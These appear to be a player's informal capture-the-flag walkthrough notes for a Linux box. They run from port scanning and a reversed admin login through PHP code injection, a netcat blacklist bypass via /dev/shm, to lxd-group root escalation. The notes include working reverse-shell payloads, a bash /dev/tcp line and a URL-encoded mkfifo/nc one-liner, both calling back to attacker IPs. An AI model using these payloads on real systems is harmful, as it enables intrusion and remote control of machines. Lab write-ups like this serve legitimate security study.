
Nmap:
	22, 80

Dirsearch:
	/admin.php ---> login page ----> username field is password and password field                                                          is username ( its reversed)
							 (also the password is there in the page source. Look carefully)

	/uploads -----> nothing yet, keeping in mind.

---

Admin.php Enum ----> Reverse Shell Hurdle:
--
After logging in , we are greeted with a bunch of texts. Read it.

`xalvas` : possible user
`beejay` : possible user

Page is vulnerable to xss and is written in php. 
So we can use `phpinfo()` in the input field.
```
<?php
phpinfo();
?>
```
It shows us the information about our PHP installation and can be used to identify installation and configuration problems.

After this read this, it connects the dots
https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo

We can also opt for a php reverse shell but the connection shuts off immediately .
```
<?php  
exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");

<?php system("find /home"); ?> ---> to look whats in home directory

with this command we can find user flag in home , just cat it.
```

With this `<?php system("cat /home/xalvas/intrusions "); ?>` ,
the intrusions file is what blacklists Netcat and prevents us from getting a connection back. 
To get a shell back , we can run nc from RAM disk `/dev/shm`.

How to do that :
1. copy nc to /dev/shm and rename it: 
	`<?php system("cp /bin/nc /dev/shm/test"); ?>`   url encode it before burping
2.  Make it executable:
    `<?php system("chmod 755 /dev/shm/test"); ?>`  url encode
3. Execute the `test` binary:
```
<%3fphp+system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|/dev/shm/test+10.10.14.17+6666+>/tmp/f")%3b+%3f>

its url encoded
```

Damn getting a reverse shell shud not be dis hard man xD jeez!

---

Path to PRIV ESC:
--

`18547936..*` ssh password of `xalvas` taken from the .wav audio files.

Gettint the unintended root path is very easy

User is in the lxd group, search lxd priv esc and follow steps .

Remember to `uname -a` to check the system archetechture its i386 smth and build your alpine container accordingly.

PWNed!
